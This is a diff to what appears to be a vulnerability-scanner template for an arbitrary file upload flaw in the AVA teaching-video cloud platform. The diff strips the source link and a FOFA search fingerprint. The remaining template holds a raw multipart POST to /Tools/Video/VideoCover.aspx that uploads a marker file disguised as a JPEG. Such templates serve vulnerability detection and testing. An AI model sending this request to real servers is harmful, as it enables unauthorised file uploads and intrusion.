@@ -3,12 +3,8 @@ info:
   name: AVA 教学视频应用云平 VideoCover 任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gh9x5xxskgf7flcb'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gh9x5xxskgf7flcb
-    fofa: body="YK_Validate/YK_Validate.js"
 http:
 - raw:
   - 'POST /Tools/Video/VideoCover.aspx HTTP/1.1
@@ -23,8 +19,6 @@ http:
     Accept-Encoding: gzip, deflate, br
 
 
-
-
     ------WebKitFormBoundarypnwfuwmmuuhmmxbv
 
 
@@ -32,8 +26,6 @@ http:
 
 
     Content-Type: image/jpeg
-
-
 
 
     dudesuite
